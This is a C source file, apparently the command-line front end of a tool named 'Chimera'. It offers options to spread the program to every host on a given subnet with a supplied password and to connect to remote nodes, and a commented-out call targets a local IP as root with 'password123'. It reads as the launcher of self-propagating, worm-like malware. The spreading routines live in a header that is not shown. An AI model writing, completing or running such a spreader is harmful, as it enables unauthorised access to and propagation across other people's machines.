#include <stdio.h>
#include <string.h>
#include "net.h"

// int main() {
//     spread_linux("192.168.1.32", "root", "password123");
// }-

void print_usage() {
    printf("Usage: chimera [OPTIONS]\n");
    printf("Options:\n");
    printf("  -h, --help\t\tPrints this help message and exits.\n");
    printf("  -s, --spread <subnet>\tSpread Chimera to hosts on the specified subnet.\n");
    printf("  -p, --password <password>\tThe password to use for the connection.\n");
    printf("  --establish-node <ip>\t\tEstablish a connection to the specified node.\n");
}

int main(int argc, char* argv[]) {
    char* subnet = NULL;
    char* password = NULL;
    char* establish_node_ip = NULL;

    // Parse command line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            print_usage();
            return 0;
        } else if (strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--spread") == 0) {
            if (i + 1 < argc) {
                subnet = argv[i + 1];
                i++;
            } else {
                fprintf(stderr, "Error: -s/--spread option requires an argument\n");
                print_usage();
                return 1;
            }
        } else if (strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--password") == 0) {
            if (i + 1 < argc) {
                password = argv[i + 1];
                i++;
            } else {
                fprintf(stderr, "Error: -p/--password option requires an argument\n");
                print_usage();
                return 1;
            }
        } else if (strcmp(argv[i], "--establish-node") == 0) {
            if (i + 1 < argc) {
                establish_node_ip = argv[i + 1];
                i++;
            } else {
                fprintf(stderr, "Error: --establish-node option requires an argument\n");
                print_usage();
                return 1;
            }
        } else {
            fprintf(stderr, "Error: Invalid command line argument %s\n", argv[i]);
            print_usage();
            return 1;
        }
    }

    // Check if the user wants to spread Chimera or establish a connection to a node
    if (subnet != NULL && password != NULL) {
        printf("Spreading Chimera to hosts on subnet %s with password %s\n", subnet, password);
        
        spread(subnet, password);
    } else if (establish_node_ip != NULL) {
        printf("Establishing connection with remote node: %s\n", establish_node_ip);
        //establish_node(establish_node_ip);
    } else {
        fprintf(stderr, "Error: Invalid command line arguments\n");
        print_usage();
        return 1;
    }

    return 0;
}
